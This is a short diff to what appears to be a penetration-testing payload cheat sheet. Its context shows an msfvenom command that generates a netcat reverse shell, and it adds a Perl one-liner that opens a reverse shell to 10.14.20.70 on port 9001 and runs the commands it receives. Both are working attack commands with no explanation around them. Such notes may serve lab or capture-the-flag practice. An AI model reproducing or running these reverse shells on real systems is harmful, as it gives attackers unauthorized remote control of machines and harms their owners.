@@ -130,3 +130,5 @@ This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloa
 ```console
 $ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
 ```
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.14.20.70:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
